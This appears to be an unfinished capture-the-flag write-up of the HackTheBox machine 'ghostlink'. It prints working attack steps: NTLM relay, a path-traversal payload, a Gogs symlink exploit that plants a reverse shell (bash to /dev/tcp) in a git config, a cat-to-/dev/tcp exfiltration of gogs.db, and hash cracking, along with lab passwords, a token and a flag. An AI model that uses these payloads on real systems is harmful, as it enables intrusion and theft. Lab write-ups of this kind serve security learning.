[*] SOCKS proxy: 127.0.0.1:1080
[*] Kernel-mode auth workaround ENABLED
[*] Keep-relaying mode ENABLED (will reload targets after success)
[*] Setting up SMB Server on port 445
[*] Setting up HTTP Server on port 8888
 * Serving Flask app 'lib.relay.servers.socksserver'
 * Debug mode: off
[*] Setting up WCF Server on port 9389

[*] Servers started, waiting for connections
Type help for list of commands
[*] Setting up RAW Server on port 6666
ghostsurf> [*] (HTTP): Client requested path: /healthcheck
[*] (HTTP): Client requested path: /healthcheck
[*] (HTTP): Connection from 10.129.190.87 controlled, attacking target http://gpz-op26-secure.ghostlink.htb
[*] (HTTP): Client requested path: /healthcheck
[*] HTTP server returned error code 200, treating as a successful login
[*] (HTTP): Authenticating connection from GHOSTLINK/SVC_CANARY@10.129.190.87 against http://gpz-op26-secure.ghostlink.htb SUCCEED [1]
[*] SOCKS: Adding GHOSTLINK/SVC_CANARY@gpz-op26-secure.ghostlink.htb(80) to active SOCKS connection. Enjoy
[*] (HTTP): Client requested path: /healthcheck
[*] (HTTP): Client requested path: /healthcheck
[*] All targets processed!
[*] (HTTP): Connection from 10.129.190.87 controlled, attacking target http://gpz-op26-secure.ghostlink.htb
[*] (HTTP): Client requested path: /healthcheck
[*] HTTP server returned error code 200, treating as a successful login
[*] (HTTP): Authenticating connection from GHOSTLINK/SVC_CANARY@10.129.190.87 against http://gpz-op26-secure.ghostlink.htb SUCCEED [2]
[*] Relay connection for GHOSTLINK/SVC_CANARY at gpz-op26-secure.ghostlink.htb(80) already exists. Discarding
[*] (HTTP): Client requested path: /healthcheck
[*] (HTTP): Client requested path: /healthcheck
[*] All targets processed!
[*] (HTTP): Connection from 10.129.190.87 controlled, attacking target http://gpz-op26-secure.ghostlink.htb
[*] (HTTP): Client requested path: /healthcheck
[*] HTTP server returned error code 200, treating as a successful login
[*] (HTTP): Authenticating connection from GHOSTLINK/SVC_CANARY@10.129.190.87 against http://gpz-op26-secure.ghostlink.htb SUCCEED [3]
[*] Relay connection for GHOSTLINK/SVC_CANARY at gpz-op26-secure.ghostlink.htb(80) already exists. Discarding
[*] (HTTP): Client requested path: /healthcheck
[*] (HTTP): Client requested path: /healthcheck
[*] All targets processed!
[*] (HTTP): Connection from 10.129.190.87 controlled, attacking target http://gpz-op26-secure.ghostlink.htb
[*] (HTTP): Client requested path: /healthcheck
[*] HTTP server returned error code 200, treating as a successful login
[*] (HTTP): Authenticating connection from GHOSTLINK/SVC_CANARY@10.129.190.87 against http://gpz-op26-secure.ghostlink.htb SUCCEED [4]
[*] Relay connection for GHOSTLINK/SVC_CANARY at gpz-op26-secure.ghostlink.htb(80) already exists. Discarding
[*] (HTTP): Client requested path: /healthcheck
[*] (HTTP): Client requested path: /healthcheck
[*] All targets processed!
[*] (HTTP): Connection from 10.129.190.87 controlled, attacking target http://gpz-op26-secure.ghostlink.htb
[*] (HTTP): Client requested path: /healthcheck
[*] HTTP server returned error code 200, treating as a successful login
[*] (HTTP): Authenticating connection from GHOSTLINK/SVC_CANARY@10.129.190.87 against http://gpz-op26-secure.ghostlink.htb SUCCEED [5]
[*] Relay connection for GHOSTLINK/SVC_CANARY at gpz-op26-secure.ghostlink.htb(80) already exists. Discarding


```

```
socks
Protocol  Target                         Username              AdminStatus  Port 
--------  -----------------------------  --------------------  -----------  ----
HTTP      gpz-op26-secure.ghostlink.htb  GHOSTLINK/SVC_CANARY  N/A          80  
```

img now works

configuring burp to tunnel through the proxy and test the enpoints


fix the bug

```
nano /home/kali/machines/ghostlink/tools/ad/ghostsurf/lib/relay/servers/socksplugins/http.py
```



Find this block in `prepareRequest()`:

python

```python
        # Append the body
        response.append(b'')
        body_parts = data.split(EOL+EOL)
        if len(body_parts) > 1:
            response.append(body_parts[1])
        else:
            response.append(b'')  # No body for GET requests
        senddata = EOL.join(response)
```

Replace it with:

python

```python
        # Append the body
        response.append(b'')
        headerEnd = data.find(EOL+EOL)
        if headerEnd != -1:
            body = data[headerEnd+4:]
        else:
            body = b''
        response.append(body)
        senddata = EOL.join(response)
```

## LFI

```
GET /api/download/%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%2577%2569%256e%2564%256f%2577%2573%255c%2577%2569%256e%252e%2569%256e%2569 HTTP/1.1
```



we're authenticated as the
ghostlink\svc_canary user, so we can attempt to download ntuser.dat from the user's profile and
inspect it with regripper for any recently opened document

```
GET /api/download/..\..\..\..\..\..\..\users\svc_canary\ntuser.dat HTTP/1.1
# Double URL Encoded
GET
/api/download/%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%
252e%252e%255c%252e%252e%255c%2575%2573%2565%2572%2573%255c%2573%2576%2563%255f%2563%2561%
256e%2561%2572%2579%255c%256e%2574%2575%2573%2565%2572%252e%2564%2561%2574 HTTP/1.1
```

ntuser.dat

```
 proxychains wget 'http://gpz-op26-secure.ghostlink.htb/api/download/..%255c..%255c..%255c..%255cUsers%255csvc_canary%255cntuser.dat' -O ntuser.dat
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
--2026-10-31 11:15:39--  http://gpz-op26-secure.ghostlink.htb/api/download/..%255c..%255c..%255c..%255cUsers%255csvc_canary%255cntuser.dat
Resolving gpz-op26-secure.ghostlink.htb (gpz-op26-secure.ghostlink.htb)... 224.0.0.1
Connecting to gpz-op26-secure.ghostlink.htb (gpz-op26-secure.ghostlink.htb)|224.0.0.1|:80... [proxychains] Strict chain  ...  127.0.0.1:1080  ...  gpz-op26-secure.ghostlink.htb:80  ...  OK
connected.
HTTP request sent, awaiting response... 200 OK
Length: 262144 (256K) [application/octet-stream]
Saving to: ‘ntuser.dat’

ntuser.dat                  100%[===========================================>] 256.00K  1.07MB/s    in 0.2s    

2026-10-31 11:15:39 (1.07 MB/s) - ‘ntuser.dat’ saved [262144/262144]

```

```
regripper -r ntuser.dat -p recentdocs
Launching recentdocs v.20200427
recentdocs v.20200427
(NTUSER.DAT) Gets contents of user's RecentDocs key

RecentDocs
**All values printed in MRUList\MRUListEx order.
Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs
LastWrite Time: 2026-05-13 01:56:02Z

Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs\.zip
LastWrite Time 2026-05-13 01:56:02Z
MRUListEx = 0
  0 = db.zip


```

Windows saves a link to recent documents location in `AppData\Roaming\Microsoft\Windows\Recent` under the same filename plus .lnk

```
proxychains wget 'http://gpz-op26-secure.ghostlink.htb/api/download/..%255c..%255c..%255c..%255cUsers%255csvc_canary%255cAppData%255cRoaming%255cMicrosoft%255cWindows%255cRecent%255cdb.zip.lnk' -O db.zip.lnk 
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
--2026-10-31 11:22:34--  http://gpz-op26-secure.ghostlink.htb/api/download/..%255c..%255c..%255c..%255cUsers%255csvc_canary%255cAppData%255cRoaming%255cMicrosoft%255cWindows%255cRecent%255cdb.zip.lnk
Resolving gpz-op26-secure.ghostlink.htb (gpz-op26-secure.ghostlink.htb)... 224.0.0.1
Connecting to gpz-op26-secure.ghostlink.htb (gpz-op26-secure.ghostlink.htb)|224.0.0.1|:80... [proxychains] Strict chain  ...  127.0.0.1:1080  ...  gpz-op26-secure.ghostlink.htb:80  ...  OK
connected.
HTTP request sent, awaiting response... 200 OK
Length: 792 [application/octet-stream]
Saving to: ‘db.zip.lnk’

db.zip.lnk                  100%[===========================================>]     792  --.-KB/s    in 0s      

2026-10-31 11:22:34 (198 MB/s) - ‘db.zip.lnk’ saved [792/792]

```

```
file db.zip.lnk                                                                      
db.zip.lnk: MS Windows shortcut, Item id list present, Points to a file or directory, Has Relative path, Unicoded, MachineID gpz-op26-secure, Archive, ctime=Wed Feb 25 18:52:39 2026, atime=Wed Feb 25 19:04:19 2026, mtime=Wed Feb 25 19:04:19 2026, length=0, window=normal, IDListSize 0x014c, Root folder "D3162B92-9365-467A-956B-92703ACA08AF", LocalBasePath "C:\Users\svc_canary\Documents\Operations\Management\db.zip"

```

```
proxychains wget 'http://gpz-op26-secure.ghostlink.htb/api/download/..%255c..%255c..%255c..%255cUsers%255csvc_canary%255cDocuments%255cOperations%255cManagement%255cdb.zip.' -O db.zip    
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
--2026-10-31 11:24:33--  http://gpz-op26-secure.ghostlink.htb/api/download/..%255c..%255c..%255c..%255cUsers%255csvc_canary%255cDocuments%255cOperations%255cManagement%255cdb.zip.
Resolving gpz-op26-secure.ghostlink.htb (gpz-op26-secure.ghostlink.htb)... 224.0.0.1
Connecting to gpz-op26-secure.ghostlink.htb (gpz-op26-secure.ghostlink.htb)|224.0.0.1|:80... [proxychains] Strict chain  ...  127.0.0.1:1080  ...  gpz-op26-secure.ghostlink.htb:80  ...  OK
connected.
HTTP request sent, awaiting response... 200 OK
Length: 165761 (162K) [application/octet-stream]
Saving to: ‘db.zip’

db.zip                      100%[===========================================>] 161.88K  --.-KB/s    in 0.09s   

2026-10-31 11:24:33 (1.72 MB/s) - ‘db.zip’ saved [165761/165761]

```

```
file db.zip    
db.zip: Zip archive data, made by v3.0 UNIX, extract using at least v2.0, last modified May 12 2026 11:37:22, uncompressed size 165246, method=deflate
                                                                                                                
┌──(kali㉿kali)-[~/machines/ghostlink]
└─$ unzip db.zip                     
Archive:  db.zip
  inflating: db.kdbx                 
  inflating: .key.keyx               
                                               
```

vroth:mOo03jpsqx8JQYMBwvFP

---
### Exploitation

Step-by-step exploitation with commands.

```shell
git clone http://gpz-op26-toolkits.ghostlink.htb/vroth/rce.git 
Cloning into 'rce'...
warning: You appear to have cloned an empty repository.
hint: Using 'master' as the name for the initial branch. This default branch name
hint: will change to "main" in Git 3.0. To configure the initial branch name
hint: to use in all of your new repositories, which will suppress this warning,
hint: call:
hint:
hint:   git config --global init.defaultBranch <name>
hint:
hint: Names commonly chosen instead of 'master' are 'main', 'trunk' and
hint: 'development'. The just-created branch can be renamed via this command:
hint:
hint:   git branch -m <name>
hint:
hint: Disable this message with "git config set advice.defaultBranchName false"
```

```
──(kali㉿kali)-[~/machines/ghostlink]
└─$ cd rce                 
                                                                                                                
┌──(kali㉿kali)-[~/machines/ghostlink/rce]
└─$ git init                                                      
Reinitialized existing Git repository in /home/kali/machines/ghostlink/rce/.git/
                                                                                                                
┌──(kali㉿kali)-[~/machines/ghostlink/rce]
└─$ ln -s .git/config link
                                                                                                                
┌──(kali㉿kali)-[~/machines/ghostlink/rce]
└─$ git add link
                                                                                                                
┌──(kali㉿kali)-[~/machines/ghostlink/rce]
└─$ git commit -m "add"                                           
[master (root-commit) 75b0089] add
 1 file changed, 1 insertion(+)
 create mode 120000 link
                                                                                                                
┌──(kali㉿kali)-[~/machines/ghostlink/rce]
└─$ git push           
Enumerating objects: 3, done.
Counting objects: 100% (3/3), done.
Writing objects: 100% (3/3), 197 bytes | 197.00 KiB/s, done.
Total 3 (delta 0), reused 0 (delta 0), pack-reused 0 (from 0)
Username for 'http://gpz-op26-toolkits.ghostlink.htb': vroth
Password for 'http://vroth@gpz-op26-toolkits.ghostlink.htb': 
To http://gpz-op26-toolkits.ghostlink.htb/vroth/rce.git
 * [new branch]      master -> master
                                                                              
```

```
curl -s "http://gpz-op26-toolkits.ghostlink.htb/api/v1/repos/vroth/rce/contents/link" \
  -H "Authorization: token c60a5d95cb04329a47df0a64275720cbf83c7216"
{"type":"symlink","target":".git/config","size":11,"name":"link","path":"link","sha":"74a16c50bb417b927af27e37af24480f00ed5232","url":"http://gpz-op26-toolkits.ghostlink.htb/api/v1/repos/vroth/rce/contents/link","git_url":"","html_url":"http://gpz-op26-toolkits.ghostlink.htb/vroth/rce/src/master/link","download_url":"http://gpz-op26-toolkits.ghostlink.htb/vroth/rce/raw/master/link","_links":{"git":"","self":"http://gpz-op26-toolkits.ghostlink.htb/api/v1/repos/vroth/rce/contents/link","html":"http://gpz-op26-toolkits.ghostlink.htb/vroth/rce/src/master/link"}}                        
```

```
curl -X PUT "http://gpz-op26-toolkits.ghostlink.htb/api/v1/repos/vroth/rce/contents/link" \
  -H "Content-Type: application/json" \
  -H "Authorization: token c60a5d95cb04329a47df0a64275720cbf83c7216" \
  -d '{
    "message": "update",
    "sha": "74a16c50bb417b927af27e37af24480f00ed5232",
    "committer": {"name": "test", "email": "test@test.com"},
    "content": "W2NvcmVdCiAgICAgICAgc3NoQ29tbWFuZCA9IGJhc2ggLWMgJ2Jhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMTQ4LzQ0NDQgMD4mMScKW3JlbW90ZSAib3JpZ2luIl0KICAgICAgICB1cmwgPSBnaXRAZ3B6LW9wMjYtdG9vbGtpdHMuZ2hvc3RsaW5rLmh0Yjp2cm90aC9yY2UuZ2l0Cg=="
  }'
{"message":"Something went wrong, please check the server logs for more information.","url":"https://github.com/gogs/docs-api"} 
```

shell as git

```
nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.148] from (UNKNOWN) [10.129.191.32] 49806
bash: cannot set terminal process group (690): Inappropriate ioctl for device
bash: no job control in this shell
git@gpz-op26-toolkits:~/data/tmp/local-repo/10$ python3 -c 'import pty; pty.spawn("/bin/bash")'
<10$ python3 -c 'import pty; pty.spawn("/bin/bash")'
bash: python3: command not found
git@gpz-op26-toolkits:~/data/tmp/local-repo/10$ id
id
uid=1000(git) gid=1000(git) groups=1000(git)
git@gpz-op26-toolkits:~/data/tmp/local-repo/10$ ls
ls
link
git@gpz-op26-toolkits:~/data/tmp/local-repo/10$ 

```

```
git@gpz-op26-toolkits:~/data$ ls /opt/gogs/data
ls /opt/gogs/data
avatars
gogs.db
sessions
ssh
tmp

```

```
cat gogs.db > /dev/tcp/10.10.14.148/9001
```

```
nc -lvnp 9001 > gogs.db 
listening on [any] 9001 ...
connect to [10.10.14.148] from (UNKNOWN) [10.129.191.32] 49798
```

## db enum

```
sqlite3 gogs.db            
SQLite version 3.53.4 2026-07-24 19:02:57
Enter ".help" for usage hints.
sqlite> SELECT id, name, email, passwd, salt, is_admin FROM user;

```

```
╭──┬───────────────┬──────────────────────┬────────────────────────────────────────────────┬──────────┬────────╮
│id│     name      │        email         │                     passwd                     │   salt   │is_admin│
╞══╪═══════════════╪══════════════════════╪════════════════════════════════════════════════╪══════════╪════════╡
│ 1│vroth          │vroth@ghostlink.htb   │12528ba6418a9741578a33e0759b2e8375470269b720069c│6y62BTJVSO│       0│
│  │               │                      │cab38f5c1cb3c287e4bf319ca7bd700d9d8a7395a4222e5a│          │        │
│  │               │                      │b326                                            │          │        │
├──┼───────────────┼──────────────────────┼────────────────────────────────────────────────┼──────────┼────────┤
│ 2│nvirelli       │nvirelli@ghostlink.htb│8d9b3a01c3a0260b39db011aed1dbf239b8b1b28af6141f2│DW3YdxPy25│       1│
│  │               │                      │8aa01d3b3ab8ffd4408bc5b9065ff957e716375a7bec1755│          │        │
│  │               │                      │d3e8                                            │          │        │
├──┼───────────────┼──────────────────────┼────────────────────────────────────────────────┼──────────┼────────┤
│ 3│gpz-tools-admin│null@ghostlink.htb    │ec5a7a9fc3417846b7baef2d301e9a0beaecf200fd5f33aa│CIRi441QwX│       1│
│  │               │                      │235c72c2b0a206f582eab05332d6e6799c78a45387b2b7fe│          │        │
│  │               │                      │7014                                            │          │        │
├──┼───────────────┼──────────────────────┼────────────────────────────────────────────────┼──────────┼────────┤
│ 4│zkovacs        │zkovacs@ghostlink.htb │a7dbbe7f55d2e4a66e8e7aa1f0fdd5cadddbc3fe4d06a060│qMOaBu0l1B│       0│
│  │               │                      │782e1b5985959461695ea9da089653099b221c0dc326caad│          │        │
│  │               │                      │01a2                                            │          │        │
├──┼───────────────┼──────────────────────┼────────────────────────────────────────────────┼──────────┼────────┤
│ 5│ohexley        │ohexley@ghostlink.htb │6b286f89df176ae6405dc75cc436f0b6493ed2c29a0b6c13│OEVEC4I5Io│       0│
│  │               │                      │63c111b22b23075ebd790c4015e315ddb3d770c3f7caa97d│          │        │
│  │               │                      │6620                                            │          │        │
╰──┴───────────────┴──────────────────────┴────────────────────────────────────────────────┴──────────┴────────
```

```
python3 GogsToHashcat.py -n 10000 -o nvirelli.hash QRIHYJqJdcDW3YdxPy25 8d9b3a01c3a0260b39db011aed1dbf239b8b1b28af6141f28aa01d3b3ab8ffd4408bc5b9065ff957e716375a7bec1755d3e8
sha256:10000:UVJJSFlKcUpkY0RXM1lkeFB5MjU=:jZs6AcOgJgs52wEa7R2/I5uLGyivYUHyiqAdOzq4/9RAi8W5Bl/5V+cWN1p77BdV0+g=
Hash file successfully written as: nvirelli.hash
```

hashcat -m 10900 nvirelli.hash /usr/share/wordlists/rockyou.txt

```
sha256:10000:RFczWWR4UHkyNQ==:jZs6AcOgJgs52wEa7R2/I5uLGyivYUHyiqAdOzq4/9RAi8W5Bl/5V+cWN1p77BdV0+g=:u47YUclrDiwWxBheaSzI
```


---
## User Flag

```
su nvirelli
Password: u47YUclrDiwWxBheaSzI
id
uid=1001(nvirelli) gid=1001(nvirelli) groups=1001(nvirelli)
/bin/bash -p
id
uid=1001(nvirelli) gid=1001(nvirelli) groups=1001(nvirelli)
which python3
ls 
link
cd /home/nvirelli
cat user.txt
3757972b50096951cd82879c0bf788f8
^C

```

---
## Privilege Escalation

### Enumeration

```
nxc smb ghostlink.htb -u nvirelli -p 'u47YUclrDiwWxBheaSzI' --users
SMB         10.129.191.32   445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:ghostlink.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.191.32   445    DC01             [+] ghostlink.htb\nvirelli:u47YUclrDiwWxBheaSzI 
SMB         10.129.191.32   445    DC01             -Username-                    -Last PW Set-       -BadPW- -Description-                                               
SMB         10.129.191.32   445    DC01             Administrator                 2026-04-10 04:34:52 0       Built-in account for administering the computer/domain 
SMB         10.129.191.32   445    DC01             Guest                         <never>             0       Built-in account for guest access to the computer/domain 
SMB         10.129.191.32   445    DC01             krbtgt                        2026-02-24 00:14:01 0       Key Distribution Center Service Account 
SMB         10.129.191.32   445    DC01             nvirelli                      2026-03-03 20:35:06 0       Identity and federation specialist 
SMB         10.129.191.32   445    DC01             kdraven                       2026-02-24 00:18:33 0       Defensive intelligence 
SMB         10.129.191.32   445    DC01             zkovacs                       2026-02-24 00:18:34 0       Cryptography and signing workflows 
SMB         10.129.191.32   445    DC01             ohexley                       2026-02-24 00:18:34 0       Binary analysis and reverse engineering 
SMB         10.129.191.32   445    DC01             vroth                         2026-02-24 00:18:34 0       Automation and script development 
SMB         10.129.191.32   445    DC01             dsoren                        2026-02-24 00:18:34 0       Digital forensics and incident response 
SMB         10.129.191.32   445    DC01             lnoctis                       2026-02-24 00:18:34 0       Open source intelligence 
SMB         10.129.191.32   445    DC01             svc_canary                    2026-02-24 14:37:09 0       Healthcheck Canary for Anika Jensen 
SMB         10.129.191.32   445    DC01             [*] Enumerated 11 local users: GHOSTLINK
                                                                                                                                                                                                                                    
┌──(kali㉿kali)-[~/tools/creds/GogsToHashcat]
└─$ nxc smb ghostlink.htb -u nvirelli -p 'u47YUclrDiwWxBheaSzI' --shares
SMB         10.129.191.32   445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:ghostlink.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.191.32   445    DC01             [+] ghostlink.htb\nvirelli:u47YUclrDiwWxBheaSzI 
SMB         10.129.191.32   445    DC01             [*] Enumerated shares
SMB         10.129.191.32   445    DC01             Share           Permissions     Remark
SMB         10.129.191.32   445    DC01             -----           -----------     ------
SMB         10.129.191.32   445    DC01             ADMIN$                          Remote Admin
SMB         10.129.191.32   445    DC01             C$                              Default share
SMB         10.129.191.32   445    DC01             IPC$            READ            Remote IPC
SMB         10.129.191.32   445    DC01             NETLOGON        READ            Logon server share 
SMB         10.129.191.32   445    DC01             SYSVOL          READ            Logon server share 

```

tried bloodhound enum but nothiing useful 

```
./chisel server -v -p 1234 --reverse --socks5
2026/10/31 16:39:05 server: Reverse tunnelling enabled
2026/10/31 16:39:05 server: Fingerprint kcZbrEAV403vdjjHMta68/nth02RI2ORymA9d/P+o2Q=
2026/10/31 16:39:05 server: Listening on http://0.0.0.0:1234
2026/10/31 16:40:21 server: session#1: Handshaking with 10.129.191.32:49820...
2026/10/31 16:40:21 server: session#1: Verifying configuration
2026/10/31 16:40:21 server: session#1: Client version (1.11.5) differs from server version (0.0.0-src)
2026/10/31 16:40:21 server: session#1: tun: Created (SOCKS enabled)
2026/10/31 16:40:21 server: session#1: tun: SSH connected
2026/10/31 16:40:21 server: session#1: tun: proxy#R:127.0.0.1:1080=>socks: Listening
2026/10/31 16:40:21 server: session#1: tun: Bound proxies


```

```
git@gpz-op26-toolkits:/tmp$ ./chisel client -v 10.10.14.148:1234 R:socks
./chisel client -v 10.10.14.148:1234 R:socks
2026/11/01 00:40:24 client: Connecting to ws://10.10.14.148:1234
2026/11/01 00:40:24 client: Handshaking...
2026/11/01 00:40:24 client: Sending config
2026/11/01 00:40:24 client: Connected (Latency 33.8415ms)
2026/11/01 00:40:24 client: tun: SSH connected

```

esc11

```
 proxychains certipy-ad find -u nvirelli@ghostlink.htb -p u47YUclrDiwWxBheaSzI -dc-ip 10.129.191.32 -dc-host dc01.ghostlink.htb -vulnerable -stdout
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
Certipy v5.1.0 - by Oliver Lyak (ly4k)

[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.129.191.32:636  ...  OK
[*] Finding certificate templates
[*] Found 33 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 11 enabled certificate templates
[*] Finding issuance policies
[*] Found 13 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'ghostlink-GPZ-OP26-SECURE-CA' via RRP
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.20.10:445  ...  OK
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Successfully retrieved CA configuration for 'ghostlink-GPZ-OP26-SECURE-CA'
[*] Checking web enrollment for CA 'ghostlink-GPZ-OP26-SECURE-CA' @ 'gpz-op26-secure.ghostlink.htb'
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.20.10:80  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.20.10:443 <--socket error or timeout!
[!] Error checking web enrollment: [Errno 111] Connection refused
[!] Use -debug to print a stacktrace
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : ghostlink-GPZ-OP26-SECURE-CA
    DNS Name                            : gpz-op26-secure.ghostlink.htb
    Certificate Subject                 : CN=ghostlink-GPZ-OP26-SECURE-CA, DC=ghostlink, DC=htb
    Certificate Serial Number           : 3F4302F3D68A6AAE4B792DB93F31CCE5
    Certificate Validity Start          : 2026-03-03 16:52:14+00:00
    Certificate Validity End            : 2126-03-03 17:02:12+00:00
    Web Enrollment
      HTTP
        Enabled                         : True
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Disabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Permissions
      Owner                             : GHOSTLINK.HTB\Administrators
      Access Rights
        ManageCa                        : GHOSTLINK.HTB\Administrators
                                          GHOSTLINK.HTB\Domain Admins
                                          GHOSTLINK.HTB\Enterprise Admins
        ManageCertificates              : GHOSTLINK.HTB\Administrators
                                          GHOSTLINK.HTB\Domain Admins
                                          GHOSTLINK.HTB\Enterprise Admins
        Enroll                          : GHOSTLINK.HTB\Authenticated Users
    [!] Vulnerabilities
      ESC8                              : Web Enrollment is enabled over HTTP.
      ESC11                             : Encryption is not enforced for ICPR (RPC) requests.
Certificate Templates                   : [!] Could not find any certificate templates
                                                                                            
```

### Exploitation

Step-by-step privilege escalation.

```shell
# Commands used
```

---
## Remediation

- Key takeaway 1
- Key takeaway 2
- Key takeaway 3

---
## References

- [Reference 1](https://github.com/momenbasel/htb-writeups/blob/main/templates/url)
- [Reference 2](https://github.com/momenbasel/htb-writeups/blob/main/templates/url)